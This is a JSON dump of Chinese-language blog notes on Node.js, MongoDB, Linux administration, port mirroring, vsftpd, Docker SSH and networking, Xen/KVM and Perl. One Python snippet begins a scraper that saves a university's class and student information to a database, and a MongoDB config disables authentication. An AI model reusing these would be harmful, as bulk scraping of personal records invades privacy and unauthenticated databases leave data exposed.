日志","tags":[{"name":"Linux","slug":"Linux","permalink":"http://yoursite.com/tags/Linux/"}]},{"title":"Node.js学习笔记","date":"2016-06-03T14:00:33.000Z","path":"others/Node-js学习笔记/","text":"新建http服务1234567891011var http = require('http');http.createServer(function (request, response) &#123; response.writeHead(200, &#123;'Content-Type': 'text/html; charset=utf-8'&#125;); if(request.url!==\"/favicon.ico\")&#123; console.log('访问'); response.write('hello,world'); response.end(\"response.end\"); &#125;&#125;).listen(8000);console.log(\"Server running at http://127.0.0.1:8000/\"); 使用function 目录结构 tp@V:/mnt/d/Node.js$ tree.├── hello.js├── models│ └── otherfuns.js└── n2_funcall.jsn2_funcall.js 12345678910111213var http = require('http');var otherfun = require(\"./models/otherfuns.js\");http.createServer(function (request, response)&#123; response.writeHead(200, &#123;'Content-Type': 'text/html; charset=utf-8'&#125;); if(request.url!==\"/favicon.ico\")&#123; otherfun['fun3'](response); otherfun['fun2'](response);//也可以用otherfun.fun2(response) response.end(\"response.end\"); &#125;&#125;).listen(8000);console.log(\"Server running at http://127.0.0.1:8000/\"); otherfuns.js 12345678910module.exports=&#123; fun2:function(res)&#123; console.log(\"我是fun2\"); res.write(\"Hello, I am fun2\"); &#125;, fun3:function(res)&#123; console.log(\"I am fun3\"); res.write(\"Hello, I am fun3\"); &#125;&#125; 效果 使用模块 models/User.js 123456789function User(id, name, age)&#123; this.id=id; this.name=name; this.age=age; this.enter=function()&#123; console.log(this.name+\"进入图书馆\"); &#125;&#125;module.exports = User; models/Teacher.js1234567891011var User = require('./User');function Teacher(id,name,age)&#123; User.apply(this,[id,name,age]); this.teach=function(res)&#123; res.write(this.name+\"讲课\"); &#125;&#125;module.exports = Teacher;```JavaScript&gt;n3_modelcall.js var http = require(‘http’); // var User = require(“./models/User”);var Teacher = require(“./models/Teacher”) http.createServer(function (request, response){ response.writeHead(200, {‘Content-Type’: ‘text/html; charset=utf-8’}); if(request.url!==”/favicon.ico”){ //funname = ‘fun3’; teacher = new Teacher(1,’我来’,18); // user.id =1; // user.name=’我来’; // user.age=18; teacher.enter(); teacher.teach(response); response.end(“response.end”); } }).listen(8000);console.log(“Server running at http://127.0.0.1:8000/“);1234567891011121314![](https://ww2.sinaimg.cn/large/006tNc79gy1fdtdb7fgu8j30b8058gln.jpg)# 使用路由&gt;models/route.js```JavaScriptmodule.exports=&#123; login:function(req, res)&#123; res.write(&quot;I am login module.&quot;); &#125;, admin:function(req, res)&#123; res.write(&quot;I am admin module.&quot;); &#125;&#125; n4_rout.js1234567891011121314151617var http = require('http');var url = require('url');var router = require('./models/route');http.createServer(function (request, response)&#123; response.writeHead(200, &#123;'Content-Type': 'text/html; charset=utf-8'&#125;); if(request.url!==\"/favicon.ico\")&#123; var pathname = url.parse(request.url).pathname; pathname = pathname.replace(/\\//, ''); console.log(pathname); router[pathname](request, response); response.end(\"response.end\"); &#125;&#125;).listen(8000);console.log(\"Server running at http://127.0.0.1:8000/\"); 读文件 models/route.js 1234567891011121314151617var optfile = require('./optfile');module.exports=&#123; login:function(req, res)&#123; function recall(data)&#123; res.write(data); res.end(\" \"); &#125; optfile.readfile('./views/login.html', recall); &#125;, admin:function(req, res)&#123; function recall(data)&#123; res.write(data); res.end(\" \"); &#125; optfile.readfile('./views/admin.html', recall); &#125;&#125; models/optfile.js1234567891011121314151617181920var fs = require('fs');module.exports = &#123; readfileSync:function(path)&#123;//同步读取 var data = fs.readFileSync(path, 'utf-8'); console.log(data); console.log('同步方法执行完毕'); &#125;, readfile:function(path, recall)&#123;//异步读取 fs.readFile(path, function(err, data)&#123; if(err)&#123; console.log(err); &#125;else&#123; console.log(data.toString()); recall(data); &#125; &#125;); console.log('异步方法执行完毕');&#125;&#125; n5_readfile.js123456789101112131415161718var http = require('http');var url = require('url');var router = require('./models/route');//var optfile = require('./models/optfile');http.createServer(function (request, response)&#123; response.writeHead(200, &#123;'Content-Type': 'text/html; charset=utf-8'&#125;); if(request.url!==\"/favicon.ico\")&#123; var pathname = url.parse(request.url).pathname; pathname = pathname.replace(/\\//, ''); console.log(pathname); router[pathname](request, response); &#125;&#125;).listen(8000);console.log(\"Server running at http://127.0.0.1:8000/\"); views/login.html1This is login page. views/admin.html1This is admin page. 写文件 models/optfile.js1234567891011121314151617var fs = require('fs');module.exports = &#123; writefile:function(path, data, recall)&#123;//异步方式 fs.writeFile(path, data, function (err)&#123; if (err)&#123; throw err; &#125; console.log('It\\'s Saved!');//文件被保存 recall(\"write file success.\"); &#125;); &#125;, writeFileSync:function(path, data)&#123;//同步方式 fs.writeFileSync(path, data); console.log(\"同步写文件完成\"); &#125;&#125; models/route.js123456789101112131415161718192021222324var optfile = require('./optfile');module.exports=&#123; login:function(req, res)&#123; function recall(data)&#123; res.write(data); res.end(\" \"); &#125; optfile.readfile('./views/login.html', recall); &#125;, admin:function(req, res)&#123; function recall(data)&#123; res.write(data); res.end(\" \"); &#125; optfile.readfile('./views/admin.html', recall); &#125;, writefile:function(req, res)&#123; function recall(data)&#123; res.write(data); res.end(\" \"); &#125; optfile.writefile('./views/test.txt', 'write file ok1.', recall); &#125;&#125; n6_writefile.js123456789101112131415161718var http = require('http');var url = require('url');var router = require('./models/route');//var optfile = require('./models/optfile');http.createServer(function (request, response)&#123; response.writeHead(200, &#123;'Content-Type': 'text/html; charset=utf-8'&#125;); if(request.url!==\"/favicon.ico\")&#123; var pathname = url.parse(request.url).pathname; pathname = pathname.replace(/\\//, ''); console.log(pathname); router[pathname](request, response); &#125;&#125;).listen(8000);console.log(\"Server running at http://127.0.0.1:8000/\"); 读取图片 models/optfile.js仅能显示图片12345678910111213141516var fs = require('fs');module.exports = &#123; readImg:function(path, res)&#123; fs.readFile(path, 'binary', function(err, file)&#123; if (err)&#123; console.log(err); return; &#125;else&#123; console.log('输出文件'); res.write(file, 'binary'); res.end(); &#125; &#125;); &#125;&#125; n7_readimg.js1234567891011121314var http = require('http');var optfile = require('./models/optfile');http.createServer(function (request, response)&#123; response.writeHead(200, &#123;'Content-Type': 'image/jpeg'&#125;); if(request.url!==\"/favicon.ico\")&#123; console.log('访问'); optfile.readImg('./images/1.png', response); console.log(\"move on\"); &#125;&#125;).listen(8000);console.log(\"Server running at http://127.0.0.1:8000/\"); 路由改造 models/optfile.js可显示文本和图片12345678910111213141516171819202122232425262728293031323334353637383940var fs = require('fs');module.exports = &#123; writefile:function(path, data, recall)&#123;//异步方式 fs.writeFile(path, data, function (err)&#123; if (err)&#123; throw err; &#125; console.log('It\\'s Saved!');//文件被保存 recall(\"write file success.\"); &#125;); &#125;, writeFileSync:function(path, data)&#123;//同步方式 fs.writeFileSync(path, data); console.log(\"同步写文件完成\"); &#125;, readImg:function(path, res)&#123; fs.readFile(path, 'binary', function(err, file)&#123; if (err)&#123; console.log(err); return; &#125;else&#123; console.log('输出文件'); res.write(file, 'binary'); res.end(); &#125; &#125;); &#125;, readfile:function(path, recall)&#123;//异步读取 fs.readFile(path, function(err, data)&#123; if(err)&#123; console.log(err); &#125;else&#123; console.log(data.toString()); recall(data); &#125; &#125;); console.log('异步方法执行完毕');&#125;,&#125; models/route.js 12345678910111213141516171819202122232425262728293031323334var optfile = require('./optfile');function getRecall(req, res)&#123; res.writeHead(200, &#123;'Content-Type': 'text/html; charset=utf-8'&#125;); function recall(data)&#123; res.write(data); res.end(\" \"); &#125; return recall;&#125;module.exports=&#123; login:function(req, res)&#123; recall = getRecall(req, res); optfile.readfile('./views/login.html', recall); &#125;, admin:function(req, res)&#123; function recall(data)&#123; res.write(data); res.end(\" \"); &#125; optfile.readfile('./views/admin.html', recall); &#125;, writefile:function(req, res)&#123; function recall(data)&#123; res.write(data); res.end(\" \"); &#125; optfile.writefile('./views/test.txt', 'write file ok1.', recall); &#125;, showimg:function(req, res)&#123; res.writeHead(200, &#123;'Content-Type': 'image/jpeg'&#125;); optfile.readImg('./images/1.png', res); &#125;&#125; n8_routhtml.js123456789101112131415var http = require('http');var url = require('url');var router = require('./models/route');http.createServer(function (request, response)&#123; if(request.url!==\"/favicon.ico\")&#123; var pathname = url.parse(request.url).pathname; pathname = pathname.replace(/\\//, ''); console.log(pathname); router[pathname](request, response); &#125;&#125;).listen(8000);console.log(\"Server running at http://127.0.0.1:8000/\");","tags":[{"name":"Node.js","slug":"Node-js","permalink":"http://yoursite.com/tags/Node-js/"}]},{"title":"MongoDB 基本操作","date":"2016-05-20T03:23:14.000Z","path":"db/MongoDB-基本操作/","text":"基本操作基本查询 以更美观的方式输出 1db.number.find().pretty() 获取数据库的所有聚合名称12&gt; db.getCollectionNames();[ &quot;phone_number&quot;, &quot;system.indexes&quot; ] 统计数据库特定聚合所有记录数量12db.phone_number.count()16119524 获取数据库特定聚合的索引 比如获取phone_number聚合的所有索引1234567891011&gt; db.phone_number.getIndexes()[ &#123; &quot;v&quot; : 1, &quot;key&quot; : &#123; &quot;_id&quot; : 1 &#125;, &quot;name&quot; : &quot;_id_&quot;, &quot;ns&quot; : &quot;blacklist.phone_number&quot; &#125;] 添加索引 为phone_number的phone字段添加索引1234567&gt; db.phone_number.ensureIndex(&#123;&quot;phone&quot;:1&#125;)&#123; &quot;createdCollectionAutomatically&quot; : false, &quot;numIndexesBefore&quot; : 1, &quot;numIndexesAfter&quot; : 2, &quot;ok&quot; : 1&#125; 再查看索引情况验证一下12345678910111213141516171819&gt; db.phone_number.getIndexes()[ &#123; &quot;v&quot; : 1, &quot;key&quot; : &#123; &quot;_id&quot; : 1 &#125;, &quot;name&quot; : &quot;_id_&quot;, &quot;ns&quot; : &quot;blacklist.phone_number&quot; &#125;, &#123; &quot;v&quot; : 1, &quot;key&quot; : &#123; &quot;phone&quot; : 1 &#125;, &quot;name&quot; : &quot;phone_1&quot;, &quot;ns&quot; : &quot;blacklist.phone_number&quot; &#125;] 分组查询group count123456789101112131415161718192021&gt; db.phone.aggregate([&#123;$group:&#123;_id:&quot;$source&quot;, num_tutorial:&#123;$sum:1&#125;&#125;&#125;])&#123; &quot;_id&quot; : &quot;youm&quot;, &quot;num_tutorial&quot; : 449 &#125;&#123; &quot;_id&quot; : &quot;tianma168&quot;, &quot;num_tutorial&quot; : 349 &#125;&#123; &quot;_id&quot; : &quot;dingdkj&quot;, &quot;num_tutorial&quot; : 3259 &#125;&#123; &quot;_id&quot; : &quot;ypyun&quot;, &quot;num_tutorial&quot; : 10192 &#125;&#123; &quot;_id&quot; : &quot;ilezan&quot;, &quot;num_tutorial&quot; : 43685 &#125;&#123; &quot;_id&quot; : &quot;ism168&quot;, &quot;num_tutorial&quot; : 2856 &#125;&#123; &quot;_id&quot; : &quot;iyylw&quot;, &quot;num_tutorial&quot; : 16284 &#125;&#123; &quot;_id&quot; : &quot;iqiyi&quot;, &quot;num_tutorial&quot; : 1 &#125;&#123; &quot;_id&quot; : &quot;xudan123.com&quot;, &quot;num_tutorial&quot; : 74808 &#125;&#123; &quot;_id&quot; : &quot;vim6&quot;, &quot;num_tutorial&quot; : 26927 &#125;&#123; &quot;_id&quot; : &quot;yzm1&quot;, &quot;num_tutorial&quot; : 449854 &#125;&#123; &quot;_id&quot; : &quot;feiq&quot;, &quot;num_tutorial&quot; : 46670 &#125;&#123; &quot;_id&quot; : &quot;83r.com&quot;, &quot;num_tutorial&quot; : 144898 &#125;&#123; &quot;_id&quot; : &quot;maz8&quot;, &quot;num_tutorial&quot; : 81461 &#125;&#123; &quot;_id&quot; : &quot;kuaima9&quot;, &quot;num_tutorial&quot; : 138903 &#125;&#123; &quot;_id&quot; : &quot;bmyzm&quot;, &quot;num_tutorial&quot; : 6015 &#125;&#123; &quot;_id&quot; : &quot;sunvarma.com&quot;, &quot;num_tutorial&quot; : 45164 &#125;&#123; &quot;_id&quot; : &quot;ema6&quot;, &quot;num_tutorial&quot; : 54819 &#125;&#123; &quot;_id&quot; : &quot;yma0.com&quot;, &quot;num_tutorial&quot; : 417669 &#125;&#123; &quot;_id&quot; : &quot;creditease&quot;, &quot;num_tutorial&quot; : 101747 &#125; 如果需要排序的话123456789101112131415161718192021&gt; db.phone.aggregate([&#123;$group:&#123;_id:&quot;$source&quot;, count:&#123;$sum:1&#125;&#125;&#125;,&#123;$sort:&#123;&quot;count&quot;:-1&#125;&#125;])&#123; &quot;_id&quot; : &quot;other&quot;, &quot;count&quot; : 6133225 &#125;&#123; &quot;_id&quot; : &quot;ly.com&quot;, &quot;count&quot; : 5235378 &#125;&#123; &quot;_id&quot; : &quot;zmyzm.com&quot;, &quot;count&quot; : 1038465 &#125;&#123; &quot;_id&quot; : &quot;f02.cn&quot;, &quot;count&quot; : 644959 &#125;&#123; &quot;_id&quot; : &quot;shjmpt.com&quot;, &quot;count&quot; : 502440 &#125;&#123; &quot;_id&quot; : &quot;yzm1&quot;, &quot;count&quot; : 449854 &#125;&#123; &quot;_id&quot; : &quot;yma0.com&quot;, &quot;count&quot; : 417669 &#125;&#123; &quot;_id&quot; : &quot;6yzm.com&quot;, &quot;count&quot; : 297152 &#125;&#123; &quot;_id&quot; : &quot;taomapt.com&quot;, &quot;count&quot; : 187613 &#125;&#123; &quot;_id&quot; : &quot;83r.com&quot;, &quot;count&quot; : 144898 &#125;&#123; &quot;_id&quot; : &quot;kuaima9&quot;, &quot;count&quot; : 138903 &#125;&#123; &quot;_id&quot; : &quot;creditease&quot;, &quot;count&quot; : 101747 &#125;&#123; &quot;_id&quot; : &quot;tongdun&quot;, &quot;count&quot; : 95012 &#125;&#123; &quot;_id&quot; : &quot;aliqin&quot;, &quot;count&quot; : 87845 &#125;&#123; &quot;_id&quot; : &quot;maz8&quot;, &quot;count&quot; : 81461 &#125;&#123; &quot;_id&quot; : &quot;xudan123.com&quot;, &quot;count&quot; : 74808 &#125;&#123; &quot;_id&quot; : &quot;ema6&quot;, &quot;count&quot; : 54819 &#125;&#123; &quot;_id&quot; : &quot;feiq&quot;, &quot;count&quot; : 46670 &#125;&#123; &quot;_id&quot; : &quot;sunvarma.com&quot;, &quot;count&quot; : 45164 &#125;&#123; &quot;_id&quot; : &quot;yayayama.com&quot;, &quot;count&quot; : 44941 &#125; MongoDB 唯一索引自动删除重复记录123456coll.ensureIndex(&#123;productid:1&#125;) // 在productid上建立普通索引coll.ensureIndex(&#123;district:1, plate:1&#125;) // 多字段索引coll.ensureIndex(&#123;productid:1&#125;, &#123;unique:true&#125;) // 唯一索引coll.ensureIndex(&#123;productid:1&#125;, &#123;unique:true, dropDups:true&#125;) // 建索引时，如果遇到索引字段值已经出现过的情况，则删除重复记录coll.getIndexes() // 查看索引coll.dropIndex(&#123;productid:1&#125;) // 删除单个索 Python 相关12345678910111213141516171819202122232425262728293031323334import requestsimport jsonfrom datetime import datetimefrom pymongo import MongoClient&apos;&apos;&apos;连接到mongodb数据库&apos;&apos;&apos;# 使用默认链接client = MongoClient()# 数据库名为gznu_all_student_infodb = client.gznu_all_student_info# 数据库中相关表记录# 学院相关信息college_collection = db.college# 班级相关信息class_collection = db.class_all_class_collection = db.all_class# 学生信息students_collection = db.studentsdef _save_class_code(url, college_code): &apos;&apos;&apos;将班级信息保持到数据库中&apos;&apos;&apos; print &apos;[*] 正在将班级&#123;&#125;信息保存到数据库中&apos;.format(college_code) info = get_info(url) for i in json.loads(info): for j in i[&apos;children&apos;]: item = &#123;&#125; item[&apos;class_code&apos;] = j[&apos;id&apos;] item[&apos;text&apos;] = j[&apos;text&apos;] item[&apos;college_code&apos;] = college_code item[&apos;update&apos;] = datetime.now() class_collection.insert(item) mongodb.config12345678port=27017dbpath=/data/db/fork=truelogpath=/data/logs/mongodb.loglogappend=truenoauth=truenohttpinterface=truerest=false 导入json文件数据将json数据导入到blacklist的phone_number集合中1mongoimport -h 127.0.0.1 -d blacklist -c phone_number --file blacklist3.json","tags":[{"name":"MongoDB","slug":"MongoDB","permalink":"http://yoursite.com/tags/MongoDB/"}]},{"title":"[杂谈]远程管理、SELinux、Raid等","date":"2016-04-20T11:49:27.000Z","path":"devops/杂谈-远程管理、SELinux、Raid等/","text":"常见远程管理工具方式1234RDP: remote desktop protocol 协议，Windows远程桌面管理telnet: CLI 界面下的远程管理，几乎所有操作系统都有，不过内容是明文传送SSH: secure shell CLI界面下的远程管理，几乎所有操作系统都有，内容加密传送，类UNIX系统下主要的远程管理方式(Linux BSD MaxOS X)RFB remote framebuffer,图形化远程管理协议，VNC--Virtual Network Computing 使用的协议，主要为类UNIX系统下主要的图形化远程管理方式 SELinux Secure Enhandced Linux 安全增强Linux是由NSA针对及时基础结构安全开发的一个全新的Linux安全策略机制。SELinux允许管理员更加灵鹤的定义安全策略。SELinux是一个内核级的安全机制，从2.6内核之后集成在内核当中，对其修改一般需要去重启才能生效 基本概览 所有的安全机制都是对两样东西做出限制：进程和系统资源(文件、网络套接字、系统调用等)。 123SELinux针对这两种类型定义了两个基本概念：域(domain)和上下文(context)前者针对进程进行限制后者针对系统资源进行限制 ps -Z可以查看进程的域ls -Z 可以查看文件的上下文信息 RAID 现代硬盘的缺陷 IO性能极弱 稳定性极差RAID廉价磁盘冗余阵列技术是通过多磁盘并行运行来提高计算机的存储IO性能RAID分为很多种类，称之为RAID级别， 1234RAID 0 读写性能RAID 1 读取性能、冗余性RAID 5 读写性能、冗余性(1块硬盘)RAID 6 读写性能、冗余性(2块硬盘)","tags":[{"name":"Linux","slug":"Linux","permalink":"http://yoursite.com/tags/Linux/"}]},{"title":"旁路镜像、端口镜像、旁路监控","date":"2016-03-20T02:27:03.000Z","path":"devops/旁路镜像、端口镜像、旁路监控/","text":"常见的网络监控模式可以分为两种 一种是旁路监控模式 另一种是串联监控模式。 1“旁路监控模式”一般是指通过交换机等网络设备的“端口镜像”功能来实现监控，在此模式下，监控设备只需要连接到交换机的指定镜像端口，所以形象的称之为“旁路监控”。 1而串联模式一般是通过网关、网桥或者代理服务器的模式来进行监控，由于监控设备做为网关或者网桥串联在网络中，所以称之为“串联监控模式”。 旁路模式的优缺点 优点：123旁路监控模式部署起来比较灵活方便，只需要在交换机上面配置镜像端口即可。不会影响现有的网络结构。而串联模式一般要作为网关、网桥或者代理服务器，所以需要对现有网络结构进行变动。旁路模式分析的是镜像端口拷贝过来的数据，对原始传递的数据包不会造成延时，不会对网速造成任何影响。而串联模式是串联在网络中的，那么所有的数据必须先经过监控系统，通过监控系统的分析检查之后，才能够发送到各个客户端，所以会对网速有一定的延时。旁路监控设备一旦故障或者停止运行，不会影响现有网络。而串联监控设备如果出现故障，会导致网络中断。 缺点：12需要交换机或者路由支持“端口镜像”功能才可以实现监控。旁路模式采用发送RST包的方式来断开TCP连接，不能禁止UDP通讯。对于UDP应用，一般还需要在路由器上面禁止UDP端口进行配合。而串联模式不存在该问题。 串联模式的优缺点 优点：12利用windows自带的“网关”、“网桥”功能即可实现，不需要硬件设备的支持。可以禁止UDP通讯数据包。 缺点：123需要更改现有的网络结构。与“旁路监控”相比较，“网关”、“网桥”的配置更加复杂些。由于是串联模式，当局域网电脑台数多时，对网速有少许的影响。这个主要取决于电脑的硬件配置。 交换机镜像端口配置 用户模式：查看初始化相关信息特权模式：查看所有信息、调试、保持配置信息全局模式：配置所有信息、针对整个路由器或交换机的所有接口接口模式：针对某一个接口的配置线控模式：对路由器进行控制的接口配置 1234567sw-1#show monitor 检查是否已存在镜像的配置sw-1#conf t 进入全局模式sw-1&lt;config&gt;#monitor session 2 source int f0/12 both 监控端口f0/12（外网口或叫被镜像端口） both代表双向监听数据 rx代表接收数据 tx代表发送数据sw-1&lt;config&gt;#monitor session 2 destination int f0/24 把信息复制到f0/24（镜像端口）sw-1&lt;config&gt;#end 返回sw-1#show monitor session 2把F0/12 进来的出去的数据复制一份给F0/24，这样我们在晟为就可以截取到数据了。","tags":[{"name":"others","slug":"others","permalink":"http://yoursite.com/tags/others/"}]},{"title":"Centos vsftpd","date":"2016-03-14T13:27:00.000Z","path":"devops/Centos-vsftpd/","text":"安装vsftpd1yum install vsftpd 设置开机启动1chkconfig vsftpd on 启动服务1service vsftpd start 添加用户组和用户1groupadd ftp mkdir /srv/ftp/test1useradd -g ftp -M -d /srv/ftp/test -s /sbin/nologin test -g接的是用户组-M表示不设置它的主目录，假设如果没有-M，则在/home下会有跟用户名(zhujin)一样的目录。-d后面接的是用zhujin登陆FTP的时候，它的初始目录。-s 后面接/sbin/nologin表示用户不需要登录系统，因为我们只需要用来登陆FTPzhujin表示用户名了 1passwd test 修改目录权限12chown -R test:ftp /srv/ftp/test/etc/init.d/vsftpd restart 相关安全设置 防止跨目录在/etc/vsftpd/vsftpd.conf 下添加 12chroot_list_enable=YESchroot_list_file=/etc/vsftpd/chroot_list 把想要限制的用户写入/etc/vsftpd/chroot_list文件中再重启vsftp服务即可 禁止匿名登录 1anonymous_enable=NO","tags":[{"name":"Linux","slug":"Linux","permalink":"http://yoursite.com/tags/Linux/"}]},{"title":"Docker-SSH","date":"2016-01-20T11:55:38.000Z","path":"virtualization/Docker-SSH/","text":"思路 使用一个ubuntu，配置好ssh服务再打包成image 使用commit构建构建镜像docker run -it ubuntu:14.04 /bin/bash更新镜像并安装ssh-server12apt-get updteapt-get install openssh-server 配置ssh 12mkdir -p /var/run/sshd/usr/sbin/sshd -D &amp; 检查ssh是否运行成功的命令1netstat -tunlp pam登录限制vim /etc/pam.d/sshd12注释掉session required pam_loginuid.so的 如果要使用密码进行ssh认证的话vim /etc/ssh/sshd_config取消注释1PasswordAuthentication yes 使用密钥认证的话在auchorized_keys文件中写入ssh client的id_rsa.pub内容12mkdir /root/.sshvi /root/.ssh/auchorized_keys 创建自动启动SSH脚本 12vi /run.shchmod +x run.sh 文件内容12#!/bin/bash/usr/sbin/sshd -D 退出容器 保存镜像1docker commit eb6bf1856445 sshd:ubuntu2 查看生成的镜像123➜ .ssh docker images sshd:ubuntu2REPOSITORY TAG IMAGE ID CREATED SIZEsshd ubuntu2 d9a07f6fd3f8 34 minutes ago 283.6 MB 使用SSH Server镜像1docker run -p 10000:22 -d sshd:ubuntu2 /run.sh 镜像启动成功 使用密码登录成功 使用密钥登录成功 使用Dockerfile构建 在宿主主机中创建相关文件 123mkdir test_ssh_in_dockercd test_ssh_in_dockertouch Dockerfile run.sh cat run.sh 12vi /run.shchmod +x run.sh cat Dockerfile 1234567891011121314151617181920212223➜ test_ssh_in_docker cat DockerfileFROM ubuntu:14.04MAINTAINER by tp.RUN apt-get -qq update -y#install SSH-ServerRUN apt-get -qq install openssh-server -yRUN mkdir -p /var/run/sshdRUN mkdir -p /root/.sshRUN sed -ri 's/session required pam_loginuid.so/#session required pam.loginuid.so/g' /etc/pam.d/sshd#copy ssh server config fileADD authorized_keys /root/.ssh/authorized_keysADD run.sh /run.shRUN chmod 755 /run.sh#open ssh portEXPOSE 22#start sshd serverCMD [\"/run.sh\"] 目录下所有文件12➜ test_ssh_in_docker lsauthorized_keys Dockerfile run.sh build镜像➜ test_ssh_in_docker docker build -t sshd:dockerfile3 . 创建容器并SSHdocker run -d -p 10244:22 sshd:dockerfile3ssh 127.0.0.1 -p 10244","tags":[{"name":"Docker","slug":"Docker","permalink":"http://yoursite.com/tags/Docker/"},{"name":"虚拟化","slug":"虚拟化","permalink":"http://yoursite.com/tags/虚拟化/"}]},{"title":"Xen Server安装教程","date":"2015-12-20T12:14:45.000Z","path":"virtualization/Xen-Server安装教程/","text":"安装环境VMware首先下载 IOS安装包 1配置信息如下 开始安装1键盘选项默认，点OK继续 ![键盘1保持默认 1accept 用户许可协议 1磁盘信息 默认虚拟存储为sda，点OK继续： 1使用本地介质安装 1不安装增强包 1跳过测试 1root密码 1网络设置 测试使用，我就用DHCP了…… 123时区设置asiashagnhai 1时间服务器 1开始安装 1安装完成","tags":[{"name":"虚拟化","slug":"虚拟化","permalink":"http://yoursite.com/tags/虚拟化/"}]},{"title":"Xen与Kvm","date":"2015-11-14T14:07:25.000Z","path":"virtualization/Xen与Kvm/","text":"Xen 是半虚拟化技术，也叫做准虚拟化技术从性能和成熟度上而言，XEN要优于KVM1XEN是在全虚拟化的基础上，把客户操作系统进行了修改，增加了一个专门的API，使客户操作系统集成了虚拟化方面的代码，该方法无需重新编译或引起陷阱，因为操作系统自身能够与虚拟进程进行很好的协作 KVM 是完全虚拟化技术，又叫硬件辅助虚拟化技术使用Linux内核集成的，所以速度较快KVM最大的好处就在于它是与Linux内核集成的1KVM是在虚拟机和硬件之间加了一个软件层--Hypervisor，或者叫做虚拟机管理程序（VMM），KVM的hypervisor是直接运行在物理硬件之上的 其他文章 虚拟化技术对比：Xen vs KVM","tags":[{"name":"虚拟化","slug":"虚拟化","permalink":"http://yoursite.com/tags/虚拟化/"}]},{"title":"Perl 学习笔记","date":"2015-08-10T03:25:03.000Z","path":"others/Perl-学习笔记/","text":"交互式环境123456➜ ~ perl -eNo code specified for -e.➜ ~ perl -e &apos;print &quot;Hello World&quot;&apos;Hello World% ➜ ~ perl -e &apos;print &quot;Hello World\\n&quot;&apos;Hello World 脚本式编程与注射123456789101112#!/usr/bin/perl##This is single-line comments.print \"Hello, World\\n\";=pod commentsThis is multiline commentThis is multiline commentThis is multiline commentThis is multiline comment=cut 数据类型 Perl 是一种弱类型语言，所以变量不需要指定类型，Perl 解释器会根据上下文自动选择匹配类型。三个基本的数据类型：标量、数组、哈希Perl 为每个变量类型设置了独立的命令空间，所以不同类型的变量可以使用相同的名称，如 $foo 和 @foo 是两个不同的变量。 标量在变量名前加$表示是标量12345#number$my_number=123;#string$my_str=&quot;123&quot;; 标量运算 .可以用来链接两个标量1print ( &quot;$my_number . $my_str\\n&quot;); 特殊字符 分别表示当前执行脚本的文件名，行号，包名。这些特殊字符是单独的标记，不能写在字符串中123print &quot;FileName:&quot; . &quot;\\t&quot;.__FILE__.&quot;\\n&quot;;print &quot;LineNumber:&quot; . &quot;\\t&quot;.__LINE__.&quot;\\n&quot;;print &quot;PackageName:&quot; . &quot;\\t&quot;.__PACKAGE__.&quot;\\n&quot;; 123FileName: run.plLineNumber: 28PackageName: main 数组 数组变量以字符”@”开头，索引从0开始也可以以 qw 开始定义数组 123@arr=(2,3,5);print @arr[2];@array = qw/这是 一个 数组/; 数组序列号12➜ ~ perl -e &quot;print(&quot;1..10&quot;,&quot;\\n&quot;)&quot;12345678910n% 哈希 哈希是一个无序的 key/value 对集合。可以使用键作为下标获取值类似Python的字典123%hash=(&apos;name&apos;=&gt;&apos;LongLi&apos;,&apos;age&apos;=&gt;18);print (%hash&#123;&apos;name&apos;&#125;, &quot;\\n&quot;);print (%hash&#123;&apos;age&apos;&#125;, &quot;\\n&quot;); 1234➜ test ./run.pl Hello, WorldnameLongLiage18","tags":[{"name":"Perl","slug":"Perl","permalink":"http://yoursite.com/tags/Perl/"}]},{"title":"Docker-跨主机连接","date":"2015-07-03T11:47:55.000Z","path":"virtualization/Docker-跨主机连接/","text":"使用网桥 配置简单、不依赖第三方软件；将容器和物理机放在同一网段 网络设置 vim /etc/network/interfaces 12345auto br0iface br0 inet staticnetmask 255.255.255.0gateway 101.210.55.1bridge_ports eth0 Docker网络设置vim /etc/default/docker 12345-b指定使用自定义网桥-b=br0--fixed-cidr限制ip地址分配范围host1: 101.211.55.64/26101.211.55.65~101.211.55.126 演示 使用自定义网桥在启动docker服务的时候，使用-b BEIDGE 或者–bridge=BEIDGE来指定使用的网桥 123456#停止服务并删除旧的网桥service docker stopbrctl delbr docker0#创建新的网桥brctl addbr bridge0ip addr add 192.168.5.1/24 dev bridge0 ip addr show bridge0 配置Docker服务默认桥接到创建的网桥上echo ‘DOCKER_OPTS=”-b=bridge0”‘ &gt;&gt; /etc/default/dockerservice docker start新建容器进行测试 使用Open vSwitch 高质量、多层虚拟交换机 使用GRE协议12GRE 通用路由协议封装隧道技术是一种通过使用互联网络的基础设施在网络之间传递数据的方式，使用隧道传送的数据可以是不同协议的数据帧或包，隧道协议将其它协议的数据帧或包重新封装然后通过隧道发送；新的帧头提供路由信息，以便通过互联网传递被封装的负载数据。 安装 apt-get install openvswitch-switchapt-get install bridge-utils 配置pc1=192.168.1.110pc2=192.168.1.551234567#建立网桥ovs-vsctl add-br obr0#添加GRE连接ovs-vsctl add-port obr0 gre0#配置Docker容器虚拟网桥set interface gre0 type=gre options:remote_ip=192.168.1.55root@tp-ubuntu:/etc/default# ovs-vsctl show 1234brctl addbr br0ifconfig br0 192.168.11.1 netmask 255.255.255.0brctl addif br0 obr0sudo brctl show 1234567891058fa415c-67aa-477d-93b7-6ac0f32fe49d Bridge &quot;obr0&quot; Port &quot;gre0&quot; Interface &quot;gre0&quot; type: gre options: &#123;remote_ip=&quot;192.168.1.55&quot;&#125; Port &quot;obr0&quot; Interface &quot;obr0&quot; type: internal ovs_version: &quot;2.5.0&quot; 修改Docker配置文件为虚拟网桥添加ovs接口vim /etc/default/docker1BRIDGE=br0 使用weave 原理：建立一个虚拟的网络，用于将运行在不同主机的Docker容器连接起来 安装1wget -O /usr/bin/weave https://raw.githubusercontent.com/zettio/weave/master/weave &amp;&amp; chmod a+x /usr/bin/weave weave操作 12345安装weave启动weave weave launch连接不同主机通过weave 启动容器 启动虚拟机 客户机1192.168.1.1101weave luanch 客户机2 1weave launch 192.168.1.110 虚拟机11weave run 192.168.11.2/24 -it ubuntu:14.04 /bin/bash 虚拟机2 1weave run 192.168.11.3/24 -it ubuntu:14.04 /bin/bash 查看weave路由状态weave ps12容器重启问题如果使用weave，则就不能再使用docker自带的auto-restart feature（如docker run –restart=always redis），因为weave是在docker之外为容器配置的网络，容器重启的时候docker本身不会做这些事情。因而，还需额外的工具来管理容器的状态（比如systemd, upstart等），这些工具要调用weave命令（weave 